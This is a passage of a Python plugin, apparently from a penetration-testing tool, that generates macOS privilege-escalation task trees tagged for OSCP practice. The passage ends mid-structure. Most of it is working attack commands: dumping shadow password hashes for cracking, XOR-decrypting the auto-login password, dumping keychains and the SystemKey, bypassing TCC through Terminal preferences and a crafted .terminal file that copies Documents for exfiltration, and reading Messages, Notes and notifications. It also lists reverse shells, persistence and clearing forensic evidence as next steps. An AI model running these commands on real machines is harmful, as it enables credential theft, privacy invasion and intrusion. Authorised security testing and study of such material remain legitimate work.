"""
macOS Privilege Escalation service plugin

Generates comprehensive tasks for macOS privilege escalation including:
- Password dumping and credential extraction (shadow passwords, keychains, kcpassword)
- TCC (Transparency, Consent, Control) bypass techniques
- Sensitive file and database enumeration
- Persistence mechanisms (LaunchAgents, LaunchDaemons, shell startups)
- User interaction attacks (sudo hijacking, dock impersonation)
- macOS-specific exploit research and CVE lookup
- Auto-start location abuse
- Application preferences manipulation

Extracted from HackTricks: macos-hardening/macos-security-and-privilege-escalation/
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class MacOSPrivEscPlugin(ServicePlugin):
    """macOS privilege escalation enumeration plugin"""

    @property
    def name(self) -> str:
        return "macos-privesc"

    @property
    def default_ports(self) -> List[int]:
        # macOS services commonly found in post-exploitation scenarios
        return [22, 548, 5900, 88, 445, 139]

    @property
    def service_names(self) -> List[str]:
        return ['ssh', 'afp', 'vnc', 'kerberos', 'smb', 'netbios-ssn']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """
        Detect macOS services or SSH which often leads to macOS access

        This plugin activates when:
        - SSH is detected (common macOS access vector)
        - AFP (Apple Filing Protocol) is detected
        - VNC (macOS screen sharing) is detected
        - SMB on macOS
        - Or can be manually triggered for macOS targets
        """
        service = port_info.get('service', '').lower()
        port = port_info.get('port')
        product = port_info.get('product', '').lower()

        # Check for macOS-specific services
        macos_indicators = [
            'ssh' in service,
            'afp' in service,
            'vnc' in service,
            'apple' in product,
            port == 548,  # AFP
            port == 5900,  # VNC
        ]

        return any(macos_indicators)

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate macOS privilege escalation task tree"""

        version = service_info.get('version', 'unknown')
        product = service_info.get('product', 'macOS')

        tasks = {
            'id': f'macos-privesc-{port}',
            'name': f'macOS Privilege Escalation Enumeration (Post-Access via Port {port})',
            'type': 'parent',
            'children': []
        }

        # PHASE 1: Initial Access & System Info
        tasks['children'].append(self._create_initial_recon())

        # PHASE 2: Password & Credential Extraction
        tasks['children'].append(self._create_password_extraction())

        # PHASE 3: TCC Database Enumeration
        tasks['children'].append(self._create_tcc_enumeration())

        # PHASE 4: Sensitive Locations
        tasks['children'].append(self._create_sensitive_locations())

        # PHASE 5: Persistence Mechanisms
        tasks['children'].append(self._create_persistence_mechanisms())

        # PHASE 6: User Interaction Attacks
        tasks['children'].append(self._create_user_interaction_attacks())

        # PHASE 7: Application Abuse
        tasks['children'].append(self._create_application_abuse())

        # PHASE 8: Exploit Research
        if version and version != 'unknown':
            tasks['children'].append(
                self._create_exploit_research(product, version, port)
            )

        return tasks

    def _create_initial_recon(self) -> Dict[str, Any]:
        """Initial macOS system reconnaissance"""
        return {
            'id': 'macos-initial-recon',
            'name': 'macOS System Reconnaissance',
            'type': 'parent',
            'children': [
                {
                    'id': 'macos-version-check',
                    'name': 'Check macOS Version',
                    'type': 'command',
                    'metadata': {
                        'command': 'sw_vers',
                        'description': 'Display macOS version information for CVE matching',
                        'flag_explanations': {
                            'sw_vers': 'Software version command - displays ProductName, ProductVersion, BuildVersion'
                        },
                        'success_indicators': [
                            'ProductName: macOS or Mac OS X displayed',
                            'ProductVersion shows version number (e.g., 13.4)',
                            'BuildVersion visible'
                        ],
                        'failure_indicators': [
                            'Command not found (not macOS)',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Research CVEs for specific macOS version',
                            'Check for kernel version: uname -a',
                            'Identify if SIP is enabled'
                        ],
                        'alternatives': [
                            'system_profiler SPSoftwareDataType',
                            'cat /System/Library/CoreServices/SystemVersion.plist',
                            'defaults read loginwindow SystemVersionStampAsString'
                        ],
                        'tags': ['QUICK_WIN', 'OSCP:HIGH', 'ENUM', 'MANUAL'],
                        'estimated_time': '5 seconds',
                        'notes': 'Critical first step - version determines exploit availability and TCC bypass techniques'
                    }
                },
                {
                    'id': 'macos-sip-check',
                    'name': 'Check System Integrity Protection (SIP) Status',
                    'type': 'command',
                    'metadata': {
                        'command': 'csrutil status',
                        'description': 'Verify if System Integrity Protection is enabled (blocks many privesc techniques)',
                        'flag_explanations': {
                            'csrutil': 'Configure System Integrity Protection utility',
                            'status': 'Display current SIP status'
                        },
                        'success_indicators': [
                            '"System Integrity Protection status: enabled" (SIP active)',
                            '"System Integrity Protection status: disabled" (SIP bypassed - rare)',
                            'Status displayed successfully'
                        ],
                        'failure_indicators': [
                            'Command requires reboot into recovery mode',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'If disabled: Direct access to protected files possible',
                            'If enabled: Focus on TCC bypass and user-level privesc',
                            'Check for SIP bypass CVEs for this version'
                        ],
                        'alternatives': [
                            'Manual: Check if /System files are writable (SIP blocks writes)',
                            'Manual: Try accessing /Library/Application Support/com.apple.TCC/TCC.db'
                        ],
                        'tags': ['QUICK_WIN', 'OSCP:HIGH', 'ENUM', 'MANUAL'],
                        'estimated_time': '5 seconds',
                        'notes': 'SIP enabled = need TCC bypass. SIP disabled = rare but enables direct DB modification'
                    }
                },
                {
                    'id': 'macos-user-enum',
                    'name': 'Enumerate Users',
                    'type': 'command',
                    'metadata': {
                        'command': 'dscl . list /Users | grep -v "^_"',
                        'description': 'List all non-service users on the system',
                        'flag_explanations': {
                            'dscl': 'Directory Service command line utility',
                            '.': 'Local directory domain',
                            'list /Users': 'List all user accounts',
                            'grep -v "^_"': 'Filter out system/service accounts (start with underscore)'
                        },
                        'success_indicators': [
                            'List of usernames displayed',
                            'Non-service accounts visible',
                            'Admin accounts identified'
                        ],
                        'failure_indicators': [
                            'Empty output',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Check each user home directory: ls -la /Users/<username>',
                            'Identify admin users: dscl . -read /Groups/admin GroupMembership',
                            'Look for passwords in user directories',
                            'Check for SSH keys in ~/.ssh/'
                        ],
                        'alternatives': [
                            'ls /Users',
                            'cat /etc/passwd',
                            'dscacheutil -q user'
                        ],
                        'tags': ['QUICK_WIN', 'OSCP:HIGH', 'ENUM', 'MANUAL'],
                        'estimated_time': '5 seconds'
                    }
                },
                {
                    'id': 'macos-admin-check',
                    'name': 'Identify Admin Users',
                    'type': 'command',
                    'metadata': {
                        'command': 'dscl . -read /Groups/admin GroupMembership',
                        'description': 'List all users with administrator privileges',
                        'flag_explanations': {
                            '-read': 'Read specific directory service record',
                            '/Groups/admin': 'Admin group path',
                            'GroupMembership': 'Attribute containing member usernames'
                        },
                        'success_indicators': [
                            'GroupMembership: <usernames> displayed',
                            'List of admin users visible'
                        ],
                        'failure_indicators': [
                            'No members found',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Target admin users for credential attacks',
                            'Check admin home directories for sensitive files',
                            'Look for sudo configuration: cat /etc/sudoers'
                        ],
                        'alternatives': [
                            'groups <username> | grep admin',
                            'dscacheutil -q group -a name admin'
                        ],
                        'tags': ['QUICK_WIN', 'OSCP:HIGH', 'ENUM'],
                        'estimated_time': '5 seconds'
                    }
                },
                {
                    'id': 'macos-running-processes',
                    'name': 'Enumerate Running Processes',
                    'type': 'command',
                    'metadata': {
                        'command': 'ps aux | grep -i -E "root|admin"',
                        'description': 'List processes running as root or admin (potential for hijacking)',
                        'flag_explanations': {
                            'ps aux': 'List all processes with user information',
                            'grep -i': 'Case-insensitive search',
                            '-E': 'Extended regex',
                            '"root|admin"': 'Match processes by root or admin users'
                        },
                        'success_indicators': [
                            'List of privileged processes',
                            'Root-owned daemons visible',
                            'Admin user processes identified'
                        ],
                        'failure_indicators': [
                            'No privileged processes (unlikely)',
                            'Limited process visibility'
                        ],
                        'next_steps': [
                            'Identify writable config files for root processes',
                            'Check for PATH hijacking opportunities',
                            'Look for processes with TCC permissions'
                        ],
                        'alternatives': [
                            'top -l 1 | grep root',
                            'launchctl list | grep -v "^-"'
                        ],
                        'tags': ['OSCP:MEDIUM', 'ENUM'],
                        'estimated_time': '10 seconds'
                    }
                }
            ]
        }

    def _create_password_extraction(self) -> Dict[str, Any]:
        """Password and credential extraction tasks"""
        return {
            'id': 'macos-password-extraction',
            'name': 'Password & Credential Extraction',
            'type': 'parent',
            'children': [
                {
                    'id': 'macos-shadow-dump',
                    'name': 'Dump Shadow Password Hashes',
                    'type': 'command',
                    'metadata': {
                        'command': 'sudo bash -c \'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \\$0\\":\\$ml\\$\\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \\"\\$\\"\\$0}"; fi; done; echo ""; done\'',
                        'description': 'Extract password hashes in hashcat format (mode 7100: macOS PBKDF2-SHA512)',
                        'flag_explanations': {
                            'find /var/db/dslocal/nodes/Default/users': 'Locate user plist files containing shadow hashes',
                            '-regex "[^_]*"': 'Exclude service accounts (start with underscore)',
                            'plutil -extract ShadowHashData.0': 'Extract shadow hash blob',
                            'SALTED-SHA512-PBKDF2': 'macOS password hash format',
                            '{iterations,salt,entropy}': 'Extract hash components for cracking'
                        },
                        'success_indicators': [
                            'Hash format: username:$ml$<iterations>$<salt>$<entropy>',
                            'Multiple user hashes extracted',
                            'Valid hashcat format output'
                        ],
                        'failure_indicators': [
                            'Permission denied (need root)',
                            'Empty output (no local users)',
                            'Malformed hash output'
                        ],
                        'next_steps': [
                            'Save hashes to file: output > macos_hashes.txt',
                            'Crack with hashcat: hashcat -m 7100 macos_hashes.txt wordlist.txt',
                            'Try common passwords first',
                            'Check for password reuse across users'
                        ],
                        'alternatives': [
                            'Manual: for l in /var/db/dslocal/nodes/Default/users/*; do defaults read "$l"; done',
                            'dscl . -read /Users/<username> ShadowHashData',
                            'Use davegrohl or similar hash conversion tools'
                        ],
                        'tags': ['OSCP:HIGH', 'PRIVESC', 'AUTOMATED'],
                        'estimated_time': '10 seconds',
                        'notes': 'Requires root access. Hash format compatible with hashcat -m 7100. Scripts available: https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2'
                    }
                },
                {
                    'id': 'macos-keychain-dump',
                    'name': 'Dump Keychain Passwords (Interactive)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Extract stored passwords from macOS Keychain (user will be prompted)',
                        'alternatives': [
                            'security dump-keychain -d',
                            'security dump-keychain | grep -A 5 "keychain"',
                            'security list-keychains (list all keychains)',
                            'security find-generic-password -ga "servicename"',
                            'security find-internet-password -ga "website"'
                        ],
                        'success_indicators': [
                            'User grants access (multiple prompts expected)',
                            'Passwords displayed in plaintext',
                            'Keychain items enumerated'
                        ],
                        'failure_indicators': [
                            'User denies access',
                            'Keychain is locked',
                            'No passwords stored'
                        ],
                        'next_steps': [
                            'Extract WiFi passwords: security find-generic-password -ga <SSID>',
                            'Extract saved browser passwords',
                            'Check for SSH keys in keychain',
                            'Document all credentials found'
                        ],
                        'tags': ['OSCP:HIGH', 'MANUAL', 'ENUM'],
                        'estimated_time': '2-5 minutes',
                        'notes': 'User prompts will appear for EACH password. Best run when user is present/cooperative or with FDA privileges. Does not work reliably on Big Sur+.'
                    }
                },
                {
                    'id': 'macos-kcpassword-check',
                    'name': 'Check for Auto-Login Password (kcpassword)',
                    'type': 'command',
                    'metadata': {
                        'command': 'sudo cat /etc/kcpassword | python3 -c "import sys; key = [0x7D, 0x89, 0x52, 0x23, 0xD2, 0xBC, 0xDD, 0xEA, 0xA3, 0xB9, 0x1F]; encrypted = sys.stdin.buffer.read(); decrypted = \'\'.join(chr(encrypted[i] ^ key[i % len(key)]) for i in range(len(encrypted))); print(decrypted.rstrip(\'\\x00\'))"',
                        'description': 'Decrypt auto-login password from /etc/kcpassword using XOR decryption (if auto-login enabled)',
                        'flag_explanations': {
                            '/etc/kcpassword': 'XOR-encrypted auto-login password file',
                            'key = [0x7D, 0x89...]': 'Static XOR key used by macOS',
                            'encrypted[i] ^ key[i % len(key)]': 'XOR decryption with key reuse'
                        },
                        'success_indicators': [
                            'Plaintext password displayed',
                            'Password matches user account',
                            'Valid credentials obtained'
                        ],
                        'failure_indicators': [
                            'File does not exist (auto-login disabled)',
                            'Permission denied',
                            'Garbled output (decryption failed)'
                        ],
                        'next_steps': [
                            'Test password on user account',
                            'Try password on other accounts (reuse)',
                            'Use for privilege escalation: sudo -i',
                            'Document in credentials database'
                        ],
                        'alternatives': [
                            'Download script: https://gist.github.com/opshope/32f65875d45215c3677d',
                            'Manual XOR: hexdump /etc/kcpassword',
                            'Check if auto-login enabled: defaults read /Library/Preferences/com.apple.loginwindow autoLoginUser'
                        ],
                        'tags': ['QUICK_WIN', 'OSCP:HIGH', 'PRIVESC', 'MANUAL'],
                        'estimated_time': '10 seconds',
                        'notes': 'Only exists if auto-login is enabled. Weak encryption, trivial to decrypt. High-value target.'
                    }
                },
                {
                    'id': 'macos-chainbreaker-systemkey',
                    'name': 'Extract Keychain with SystemKey (Chainbreaker)',
                    'type': 'command',
                    'metadata': {
                        'command': 'sudo hexdump -s 8 -n 24 -e \'1/1 "%.2x"\' /var/db/SystemKey && echo',
                        'description': 'Extract SystemKey for offline keychain decryption (requires root + SIP disabled)',
                        'flag_explanations': {
                            'hexdump': 'Display file in hexadecimal format',
                            '-s 8': 'Skip first 8 bytes',
                            '-n 24': 'Read 24 bytes (key length)',
                            '-e \'1/1 "%.2x"\'': 'Format as continuous hex string',
                            '/var/db/SystemKey': 'macOS keychain master key (SIP protected)'
                        },
                        'success_indicators': [
                            '48-character hex string displayed',
                            'Key extracted successfully',
                            'No permission errors'
                        ],
                        'failure_indicators': [
                            'Permission denied (SIP enabled)',
                            'File does not exist',
                            'Invalid hex output'
                        ],
                        'next_steps': [
                            'Copy System.keychain: cp /Library/Keychains/System.keychain /tmp/',
                            'Use chainbreaker: python chainbreaker.py --dump-all --key <SYSTEMKEY> /tmp/System.keychain',
                            'Extract user keychains with same key',
                            'Export all passwords and certificates'
                        ],
                        'alternatives': [
                            'Use keychaindump (deprecated on Big Sur+)',
                            'Memory dump of securityd process',
                            'Crack keychain hash with hashcat'
                        ],
                        'tags': ['OSCP:MEDIUM', 'PRIVESC', 'ADVANCED'],
                        'estimated_time': '5 seconds',
                        'notes': 'Requires: (1) root, (2) SIP disabled. Chainbreaker: https://github.com/n0fate/chainbreaker. Extract passwords offline after exfil.'
                    }
                },
                {
                    'id': 'macos-ssh-keys',
                    'name': 'Search for SSH Private Keys',
                    'type': 'command',
                    'metadata': {
                        'command': 'find /Users -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null',
                        'description': 'Locate SSH private keys in user home directories',
                        'flag_explanations': {
                            'find /Users': 'Search all user directories',
                            '-name "id_rsa"': 'RSA private key (most common)',
                            '-o': 'OR operator',
                            'id_dsa, id_ecdsa, id_ed25519': 'Other SSH key types',
                            '2>/dev/null': 'Suppress permission errors'
                        },
                        'success_indicators': [
                            'Key files found',
                            'Paths to private keys displayed',
                            'Multiple users with keys'
                        ],
                        'failure_indicators': [
                            'No keys found',
                            'All paths permission denied'
                        ],
                        'next_steps': [
                            'Check key permissions (should be 600)',
                            'Copy keys: cat /Users/<user>/.ssh/id_rsa',
                            'Check authorized_keys for targets',
                            'Test keys on localhost and other hosts',
                            'Check for passphrases: ssh-keygen -y -f <key>'
                        ],
                        'alternatives': [
                            'Manual: ls -la /Users/*/.ssh/',
                            'grep -r "BEGIN RSA PRIVATE KEY" /Users/',
                            'find / -name "*.pem" 2>/dev/null'
                        ],
                        'tags': ['QUICK_WIN', 'OSCP:HIGH', 'ENUM', 'PRIVESC'],
                        'estimated_time': '15 seconds'
                    }
                },
                {
                    'id': 'macos-bash-history',
                    'name': 'Search Shell History for Passwords',
                    'type': 'command',
                    'metadata': {
                        'command': 'find /Users -name ".bash_history" -o -name ".zsh_history" 2>/dev/null -exec grep -H -i -E "password|passwd|pwd|secret|token|key|credential" {} \\;',
                        'description': 'Extract password-related commands from shell history files',
                        'flag_explanations': {
                            '-name ".bash_history"': 'Bash shell history',
                            '-name ".zsh_history"': 'Zsh shell history (macOS default)',
                            '-exec grep': 'Search each file found',
                            '-H': 'Print filename with output',
                            '-i': 'Case-insensitive search',
                            '-E': 'Extended regex',
                            '"password|passwd|..."': 'Common password-related terms'
                        },
                        'success_indicators': [
                            'Commands with passwords in cleartext',
                            'Connection strings with credentials',
                            'Export statements with secrets'
                        ],
                        'failure_indicators': [
                            'No matches found',
                            'History files empty',
                            'All users disabled history'
                        ],
                        'next_steps': [
                            'Extract all credentials found',
                            'Test credentials on system',
                            'Check for database connection strings',
                            'Look for API keys and tokens',
                            'Document all secrets'
                        ],
                        'alternatives': [
                            'cat ~/.bash_history | grep -i pass',
                            'cat ~/.zsh_history | grep -i pass',
                            'history | grep -i pass (current session)'
                        ],
                        'tags': ['QUICK_WIN', 'OSCP:HIGH', 'ENUM'],
                        'estimated_time': '10 seconds',
                        'notes': 'Often contains cleartext passwords from: mysql -u root -p<PASSWORD>, curl commands, etc.'
                    }
                }
            ]
        }

    def _create_tcc_enumeration(self) -> Dict[str, Any]:
        """TCC database enumeration and bypass tasks"""
        return {
            'id': 'macos-tcc-enum',
            'name': 'TCC (Transparency Consent Control) Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': 'macos-tcc-user-db',
                    'name': 'Query User TCC Database',
                    'type': 'command',
                    'metadata': {
                        'command': 'sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "SELECT service, client, auth_value, auth_reason FROM access WHERE auth_value=2;"',
                        'description': 'List all TCC permissions granted to applications (user database)',
                        'flag_explanations': {
                            '"$HOME/Library/Application Support/com.apple.TCC/TCC.db"': 'User-level TCC database',
                            'service': 'TCC permission type (kTCCServiceMicrophone, kTCCServiceCamera, etc.)',
                            'client': 'Application bundle ID or binary path',
                            'auth_value=2': 'Filter for allowed (2) permissions (0=denied, 1=unknown, 3=limited)'
                        },
                        'success_indicators': [
                            'List of applications with TCC permissions',
                            'Full Disk Access (kTCCServiceSystemPolicyAllFiles) grants found',
                            'Multiple service types visible'
                        ],
                        'failure_indicators': [
                            'Permission denied (database TCC protected)',
                            'Database locked',
                            'Empty results'
                        ],
                        'next_steps': [
                            'Identify apps with FDA (Full Disk Access)',
                            'Look for Terminal, iTerm, or other scriptable apps with permissions',
                            'Check which apps can access Contacts, Photos, etc.',
                            'Plan TCC bypass via inherited permissions'
                        ],
                        'alternatives': [
                            'Manual: Open System Preferences > Security & Privacy > Privacy',
                            'tccutil list (limited output)',
                            'Query system DB: sudo sqlite3 /Library/Application\\ Support/com.apple.TCC/TCC.db'
                        ],
                        'tags': ['OSCP:HIGH', 'ENUM', 'TCC'],
                        'estimated_time': '5 seconds',
                        'notes': 'TCC database itself is TCC-protected. May need FDA process to read. Key services: kTCCServiceSystemPolicyAllFiles (FDA), kTCCServiceCamera, kTCCServiceMicrophone.'
                    }
                },
                {
                    'id': 'macos-tcc-fda-apps',
                    'name': 'Identify Full Disk Access Applications',
                    'type': 'command',
                    'metadata': {
                        'command': 'sudo sqlite3 /Library/Application\\ Support/com.apple.TCC/TCC.db "SELECT service, client, auth_value FROM access WHERE service=\'kTCCServiceSystemPolicyAllFiles\' AND auth_value=2;"',
                        'description': 'List all applications with Full Disk Access (critical for TCC bypass)',
                        'flag_explanations': {
                            '/Library/Application Support/com.apple.TCC/TCC.db': 'System-wide TCC database (SIP protected)',
                            'kTCCServiceSystemPolicyAllFiles': 'Full Disk Access permission service',
                            'auth_value=2': 'Allowed permissions only'
                        },
                        'success_indicators': [
                            'List of FDA-enabled applications',
                            'Terminal.app or iTerm.app in list (jackpot)',
                            'Third-party apps with FDA found'
                        ],
                        'failure_indicators': [
                            'Permission denied (need root)',
                            'No FDA apps configured',
                            'Database locked'
                        ],
                        'next_steps': [
                            'If Terminal has FDA: Execute TCC bypass via .terminal file',
                            'If other app has FDA: Check for command injection',
                            'Identify child process inheritance paths',
                            'Plan persistence via FDA app'
                        ],
                        'alternatives': [
                            'Check GUI: System Preferences > Security & Privacy > Privacy > Full Disk Access',
                            'Query user DB for FDA: sqlite3 ~/Library/Application\\ Support/com.apple.TCC/TCC.db'
                        ],
                        'tags': ['OSCP:HIGH', 'ENUM', 'TCC', 'PRIVESC'],
                        'estimated_time': '5 seconds',
                        'notes': 'FDA = Full Disk Access. Apps with FDA can read TCC databases, sensitive files, etc. Common FDA apps: Terminal, iTerm2, backup tools.'
                    }
                },
                {
                    'id': 'macos-tcc-reset',
                    'name': 'Reset TCC Permissions (if needed)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Reset TCC permissions for testing or cleanup',
                        'alternatives': [
                            'Reset all for app: tccutil reset All com.apple.Terminal',
                            'Reset specific service: tccutil reset Camera com.some.app',
                            'Reset everything: tccutil reset All',
                            'Manual DB edit (requires FDA or SIP bypass)'
                        ],
                        'tags': ['OSCP:LOW', 'MANUAL', 'TCC'],
                        'estimated_time': '10 seconds',
                        'notes': 'User can reset permissions. Useful for re-triggering prompts or clearing forensic evidence.'
                    }
                },
                {
                    'id': 'macos-tcc-bypass-terminal',
                    'name': 'TCC Bypass via Terminal Preferences',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Abuse Terminal.app startup command if Terminal has FDA or other TCC permissions',
                        'alternatives': [
                            'Step 1: Set startup command: /usr/libexec/PlistBuddy -c "Set :\\"Window Settings\\":\\"Basic\\":\\"CommandString\\" \'touch /tmp/tcc-bypass\'" ~/Library/Preferences/com.apple.Terminal.plist',
                            'Step 2: Disable shell mode: /usr/libexec/PlistBuddy -c "Set :\\"Window Settings\\":\\"Basic\\":\\"RunCommandAsShell\\" 0" ~/Library/Preferences/com.apple.Terminal.plist',
                            'Step 3: Open Terminal: open /System/Applications/Utilities/Terminal.app',
                            'Step 4: Command executes with Terminal FDA privileges',
                            'Cleanup: /usr/libexec/PlistBuddy -c "Set :\\"Window Settings\\":\\"Basic\\":\\"CommandString\\" \'\'" ~/Library/Preferences/com.apple.Terminal.plist'
                        ],
                        'success_indicators': [
                            'Terminal opens and executes command',
                            'Command runs with FDA privileges',
                            'Can access TCC-protected locations'
                        ],
                        'failure_indicators': [
                            'Terminal doesn\'t have TCC permissions',
                            'Command not executed',
                            'Preferences locked'
                        ],
                        'next_steps': [
                            'Copy TCC database: cp ~/Library/Application\\ Support/com.apple.TCC/TCC.db /tmp/',
                            'Access sensitive files in ~/Documents, ~/Desktop, etc.',
                            'Exfiltrate data using Terminal permissions',
                            'Establish persistence'
                        ],
                        'tags': ['OSCP:HIGH', 'TCC', 'PRIVESC'],
                        'estimated_time': '2-3 minutes',
                        'notes': 'Powerful if Terminal has FDA. Command visible in Terminal window. User may notice. See: https://theevilbit.github.io/beyond/beyond_0030/'
                    }
                },
                {
                    'id': 'macos-tcc-bypass-dot-terminal',
                    'name': 'TCC Bypass via .terminal File',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Execute commands with Terminal FDA permissions via crafted .terminal file',
                        'alternatives': [
                            'Create .terminal file with embedded command',
                            'Example payload in task notes',
                            'Trigger: open /tmp/exploit.terminal',
                            'Command executes with Terminal inherited TCC'
                        ],
                        'success_indicators': [
                            'Terminal opens automatically',
                            'Command executes',
                            'Access to TCC-protected resources'
                        ],
                        'failure_indicators': [
                            'Terminal doesn\'t open',
                            'Command not executed',
                            'User denies execution'
                        ],
                        'next_steps': [
                            'Exfiltrate sensitive documents',
                            'Copy TCC databases',
                            'Establish reverse shell',
                            'Create persistence mechanism'
                        ],
                        'tags': ['OSCP:HIGH', 'TCC', 'PRIVESC'],
                        'estimated_time': '2-3 minutes',
                        'notes': '''
Example .terminal file:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp -r ~/Documents /tmp/exfil/</string>
    <key>RunCommandAsShell</key>
    <false/>
</dict>
</plist>

Save as exploit.terminal, then: open exploit.terminal
Alternative extensions: .command, .tool (execute shell scripts with Terminal TCC)
                        '''
                    }
                }
            ]
        }

    def _create_sensitive_locations(self) -> Dict[str, Any]:
        """Sensitive file and database enumeration"""
        return {
            'id': 'macos-sensitive-locations',
            'name': 'Sensitive File & Database Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': 'macos-messages-db',
                    'name': 'Extract Messages Database',
                    'type': 'command',
                    'metadata': {
                        'command': 'sqlite3 "$HOME/Library/Messages/chat.db" "SELECT datetime(date/1000000000 + strftime(\'%s\',\'2001-01-01\'), \'unixepoch\', \'localtime\') as date, text, handle_id FROM message ORDER BY date DESC LIMIT 100;"',
                        'description': 'Extract recent iMessage and SMS messages from chat database',
                        'flag_explanations': {
                            '$HOME/Library/Messages/chat.db': 'SQLite database containing all Messages app data',
                            'datetime(date/1000000000 + strftime...)': 'Convert macOS epoch (2001-01-01) to readable date',
                            'text, handle_id': 'Message content and sender/recipient identifier',
                            'LIMIT 100': 'Show 100 most recent messages'
                        },
                        'success_indicators': [
                            'Recent messages displayed',
                            'Timestamps and content visible',
                            'Contact information revealed'
                        ],
                        'failure_indicators': [
                            'Database locked',
                            'Permission denied (TCC protected)',
                            'No messages found'
                        ],
                        'next_steps': [
                            'Search for sensitive keywords: SELECT * FROM message WHERE text LIKE "%password%"',
                            'Extract attachments: SELECT * FROM attachment',
                            'Find deleted messages: SELECT * FROM deleted_messages',
                            'Dump full database for offline analysis'
                        ],
                        'alternatives': [
                            'sqlite3 $HOME/Library/Messages/chat.db .tables',
                            'sqlite3 $HOME/Library/Messages/chat.db "SELECT * FROM attachment;"',
                            'Manual: Open Messages.app (if GUI available)'
                        ],
                        'tags': ['OSCP:HIGH', 'ENUM', 'SENSITIVE'],
                        'estimated_time': '10 seconds',
                        'notes': 'May contain credentials, 2FA codes, sensitive conversations. TCC protected - need FDA or Messages.app permissions.'
                    }
                },
                {
                    'id': 'macos-notes-db',
                    'name': 'Extract Notes Database',
                    'type': 'command',
                    'metadata': {
                        'command': 'for i in $(sqlite3 ~/Library/Group\\ Containers/group.com.apple.notes/NoteStore.sqlite "SELECT Z_PK FROM ZICNOTEDATA;"); do sqlite3 ~/Library/Group\\ Containers/group.com.apple.notes/NoteStore.sqlite "SELECT writefile(\'/tmp/note_$i.gz\', ZDATA) FROM ZICNOTEDATA WHERE Z_PK = \'$i\';"; zcat /tmp/note_$i.gz 2>/dev/null || cat /tmp/note_$i.gz; done',
                        'description': 'Extract and decompress all Apple Notes content',
                        'flag_explanations': {
                            'group.com.apple.notes/NoteStore.sqlite': 'SQLite database for Notes.app',
                            'ZICNOTEDATA': 'Table containing note content',
                            'writefile()': 'SQLite function to extract BLOB data',
                            'ZDATA': 'Compressed note content',
                            'zcat': 'Decompress gzip data'
                        },
                        'success_indicators': [
                            'Note content extracted',
                            'Readable text displayed',
                            'Multiple notes processed'
                        ],
                        'failure_indicators': [
                            'Database locked',
                            'Permission denied',
                            'Decompression errors'
                        ],
                        'next_steps': [
                            'Search notes for passwords',
                            'Look for API keys, tokens',
                            'Extract embedded images/attachments',
                            'Check for infrastructure diagrams'
                        ],
                        'alternatives': [
                            'sqlite3 ~/Library/Group\\ Containers/group.com.apple.notes/NoteStore.sqlite .dump',
                            'Manual: Open Notes.app',
                            'Export as HTML: plutil -convert xml1 NoteStore.sqlite'
                        ],
                        'tags': ['OSCP:HIGH', 'ENUM', 'SENSITIVE'],
                        'estimated_time': '15 seconds',
                        'notes': 'Users often store passwords, network diagrams, server IPs in Notes. High-value target.'
                    }
                },
                {
                    'id': 'macos-notifications-db',
                    'name': 'Extract Notification Database',
                    'type': 'command',
                    'metadata': {
                        'command': 'strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 -E "password|token|secret|credential|slack|teams"',
                        'description': 'Search notification database for sensitive information from apps (Slack, email, etc.)',
                        'flag_explanations': {
                            'getconf DARWIN_USER_DIR': 'Get user temporary directory path',
                            'com.apple.notificationcenter/db2/db': 'Notification center database',
                            'strings': 'Extract readable strings from binary database',
                            'grep -A4': 'Show 4 lines after match (capture full notification)',
                            'slack|teams': 'Common apps that expose sensitive info in notifications'
                        },
                        'success_indicators': [
                            'Notification content extracted',
                            'Sensitive information visible',
                            'App names and messages recovered'
                        ],
                        'failure_indicators': [
                            'Database not found',
                            'No sensitive content',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Extract Slack messages/tokens',
                            'Look for email previews with credentials',
                            'Find 2FA codes from notifications',
                            'Identify monitoring/alerting tools in use'
                        ],
                        'alternatives': [
                            'sqlite3 $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db .dump',
                            'Manual: Check Notification Center UI'
                        ],
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'SENSITIVE'],
                        'estimated_time': '10 seconds',
                        'notes': 'Notifications often contain partial credentials, 2FA codes, sensitive message previews. Database is binary BLOB format.'
                    }
                },
                {
                    'id': 'macos-wifi-passwords',
                    'name': 'Extract WiFi Passwords from Keychain',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Extract saved WiFi passwords from system keychain',
                        'alternatives': [
                            'security find-generic-password -ga "WiFiNetworkName" (prompts for password)',
                            'List WiFi networks: /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s',
                            'Get current network: /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I | grep " SSID"',
                            'Extract specific: security find-generic-password -D "AirPort network password" -a "SSID" -gw'
                        ],
                        'success_indicators': [
                            'Password displayed',
                            'User grants keychain access',
                            'Multiple WiFi credentials extracted'
                        ],
